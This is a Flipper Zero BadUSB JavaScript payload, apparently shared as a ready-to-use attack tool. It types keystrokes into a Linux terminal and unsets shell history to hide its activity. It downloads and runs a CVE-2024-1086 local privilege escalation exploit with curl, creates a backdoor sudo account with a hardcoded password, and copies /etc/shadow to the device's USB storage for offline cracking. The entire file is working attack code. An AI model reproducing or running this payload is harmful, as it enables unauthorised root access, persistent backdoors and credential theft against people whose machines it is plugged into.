//
//     __     ______     ______   ______     __         __  __    
//    /\ \   /\  ___\   /\__  _\ /\  == \   /\ \       /\ \/ /    
//   _\_\ \  \ \  __\   \/_/\ \/ \ \  __<   \ \ \____  \ \  _"-.  
//  /\_____\  \ \_____\    \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
//  \/_____/   \/_____/     \/_/   \/_____/   \/_____/   \/_/\/_/ 
// 
//                                                             
// F0 CVE-2024-1086 exploit, sudo user creation, and exfil of /etc/shadow to FZ USB Mass Storage
// Version 1.0
// 
// CVE-2024-1086 is a universal local privilege escalation Proof-of-Concept exploit.
// More info here: https://github.com/Notselwyn/CVE-2024-1086
//
// This JavaScript payload builds upon the CVE-2024-1086 BadUSB script to take things a step further.
// Once the exploit has gained elevated privledges, it adds a new sudo user (line: ##), then exfils /etc/shadow to usb mass storage for offline cracking.
//
// Author: JetBlk 
//

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let dialog = require("dialog");

// Storage definition for data exfil
let image = "/ext/apps_data/mass_storage/PHUN.img";
let size = 8 * 1024 * 1024;

// Define your new sudo account info
let suUser = "skid";
let suPassword = "Sup3rDup3rPW1!";

// Terminal and Script definition
let terminal = ["CTRL", "ALT", "t"];
let script = [
    "bash -c '",
    "curl -L -O https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit;",
    "chmod +x exploit;",
    "./exploit;",
    "useradd -G sudo,wheel "+suUser+" -p "+suPassword+";",
    "img=PHUN;",
    "disk=/dev/disk/by-id/usb-Flipper_Mass_Storage_$img-0:0;",
    "part=$disk-part1;",
    "while [ ! -b $part ];do sleep 1;done;",
    "mnt=$(mktemp -d);",
    "date=$(date +%Y-%m-%d);",
    "time=$(date +%s);",
    "sudo mount $part $mnt;",
    "cat /etc/shadow > $mnt/shadow_$date-$time.cp;",
    "sync $mnt;",
    "sudo umount $part;",
    "sudo eject $disk;",
    "rm -rf $mnt",
    "'&disown;exit",
];

// Assemble the script into a single command
let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

// Get storage ready
print("Checking for Image...");
if (storage.exists(image)) {
    print ("Storage Exists.");
}
else {
	print ("Creating Storage...");
	usbdisk.createImage(image, size);
}

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

dialog.message("Payload for CVE-2024-1086", "Press OK to start");
badusb.press("CTRL", "ALT", "t");
delay(500);
badusb.println("unset HISTFILE SAVEHIST PROMPT_COMMAND");
delay(300);
print("Phase 1: Downloading payload for CVE-2024-1086 and executing...");
badusb.println(command, 10);
badusb.press("ENTER");
print("Phase 2: Adding a new sudo user and exfil /etc/shadow to USB...");
delay(300);
badusb.quit();

delay(2000);
usbdisk.start(image);
print("Please wait until the terminal closes to eject.");

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Script Complete!");